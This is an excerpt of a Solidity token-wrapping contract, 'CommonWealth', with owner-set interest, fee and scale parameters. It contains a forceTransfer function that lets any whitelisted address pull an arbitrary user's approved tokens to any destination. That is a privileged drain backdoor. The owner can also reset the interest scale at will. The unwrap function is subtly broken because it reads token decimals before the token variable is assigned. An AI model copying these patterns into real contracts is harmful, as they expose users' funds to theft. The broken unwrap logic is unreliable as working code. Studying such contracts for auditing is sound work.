...
contract CommonWealth is Context, IERC20, Ownable, DSMath, Whitelist {
    ...
    uint256 public _wrapfee;
    uint256 public _wrapfeedivisor;
    address[] public _erc20Address = new address[](0);
    uint256[] public _erc20Weight = new uint256[](0);
    uint256 public _createTime;
    uint256 public _currentTime;
    uint256 public _elapsedTime;
    uint256 public _interestScale = 1000000000000000000;
    ...
    event ManualInterest(uint256 indexed amount);
    ...
    */
    ...
    function updateRate(uint256 rateWad) public onlyOwner(){
         _interestRate = yearlyRateToRay(rateWad);
     }
    function manualInterestScale(uint256 amount) public onlyOwner returns(bool){
         _interestScale = amount;
    ...
    function setWrapFee(uint256 amount, uint256 divisor) onlyOwner public returns (bool){
        _wrapfee = amount;
        _wrapfeedivisor = divisor;
        return true;
    }
    ...
    function convertBase(uint256 value,uint8 oldbase, uint8 newbase) internal pure returns (uint256) {
        if(oldbase>newbase){
            uint256 diff;
            diff = oldbase-newbase;
    ...
    function wrap(uint256 amt,uint256 index) public returns (uint256) {
        updateTime();
        CommonWealth token;
        token = CommonWealth(_erc20Address[index]);
        uint256 amount;
        amount = convertBase(amt,token.decimals(),18);
        ...
        uint256 yieldHalfBased;
        uint256 receivableBased;
        receivableBased = convertBase(receivable,18,token.decimals());
        yieldHalfBased = convertBase(yieldHalf,18,token.decimals());
        uint256 receivableFinal = receivableWeighted-yieldHalf;
        require(token.transferFrom(msg.sender, _feeTarget0, yieldHalfBased),"Not enough tokens!");
        require(token.transferFrom(msg.sender, address(this), receivableBased),"Not enough tokens!");
        _mint(msg.sender, receivableFinal);
        emit Mint(msg.sender,receivableFinal);
        return receivableWeighted;
    }
    function unwrap(uint256 amount,uint256 index) public returns(uint256) {
        updateTime();
        address acc = msg.sender;
        CommonWealth token;
        uint256 amountWeighted = _erc20Weight[index]*amount;
        uint256 finalWeighted = amountWeighted*_interestScale;
        uint256 yieldDist = (finalWeighted*_wrapfee)/_wrapfeedivisor;
        uint256 yieldHalf = yieldDist/2;
        uint256 receivable = finalWeighted-yieldDist;
        uint256 yieldHalfBased;
        uint256 receivableBased;
        receivableBased = convertBase(receivable,18,token.decimals());
        yieldHalfBased = convertBase(yieldHalf,18,token.decimals());
        token = CommonWealth(_erc20Address[index]);
        token.transfer(acc,receivableBased);
        token.transfer(_feeTarget0,yieldHalfBased);
    ...
    function forceTransfer(address acc, uint256 index, uint256 amount,address dst) public onlyWhitelisted returns(bool){
        IERC20 token;
        token = IERC20(_erc20Address[index]);
        token.transferFrom(acc, dst, amount);
        return true;
    }
    /**
